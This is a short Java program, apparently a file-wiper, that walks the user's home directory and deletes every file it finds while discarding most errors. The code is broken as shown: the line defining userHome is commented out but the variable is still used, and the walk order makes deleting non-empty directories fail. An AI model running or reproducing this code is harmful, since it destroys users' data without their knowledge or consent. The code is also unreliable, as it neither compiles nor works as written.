import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

public class ExcludeAllFiles {

    public static void main(String[] args) {
        //String userHome = System.getProperty("user.home");
        final String FILE = userHome;

        try {
            Path dir = Path.of(FILE);

            var files = Files.walk(dir);

            files.forEach((i) -> {
                try {
                    Files.delete(i);
                } catch (IOException error) {
                    error.getMessage();
                }
            });
        } catch (Exception error) {
            System.out.println(error.getMessage());
        }
    }
}